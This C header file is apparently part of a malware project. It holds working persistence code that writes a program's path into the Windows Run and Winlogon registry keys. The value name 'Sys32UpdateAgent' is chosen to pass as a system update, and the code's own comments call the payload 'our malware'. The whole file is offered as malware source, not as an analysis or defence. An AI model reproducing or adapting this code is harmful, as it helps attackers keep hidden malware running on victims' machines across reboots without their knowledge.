#ifndef PERS_H
#define PERS_H

#include <windows.h>
#include <stdlib.h>
#include "helper.h" 

#define PERS_NAME "Sys32UpdateAgent"

BOOL InjectRunRegistry(const char *malwareFull, int malwareFullLen) {
	HKEY hKey = NULL;
	const char *REG = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	DWORD errCode;
	char *errMsg = NULL;

	// Get our handle to the registry
	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while opening the Run registry key: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	// Add to the registry key, the path to our malware
	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while setting registry key: %s\n", errMsg);
		LocalFree(errMsg);
		RegCloseKey(hKey);
		return FALSE;
	}

	printf("Run registry key set for: %s\n", malwareFull);
	return TRUE;
}

BOOL InjectWinlogonRegistry(const char *malwareFull, int malwareFullLen) {
	HKEY hKey = NULL;
	const char *REG = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
	DWORD errCode;
	char *errMsg = NULL;

	// Get our handle to the registry
	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while opening the Winlogon registry key: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	// Add to the registry key, the path to our malware
	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while setting registry key: %s\n", errMsg);
		LocalFree(errMsg);
		RegCloseKey(hKey);
		return FALSE;
	}

	printf("Winlogon registry key set for: %s\n", malwareFull);
	return TRUE;
}

#endif // PERSH_H

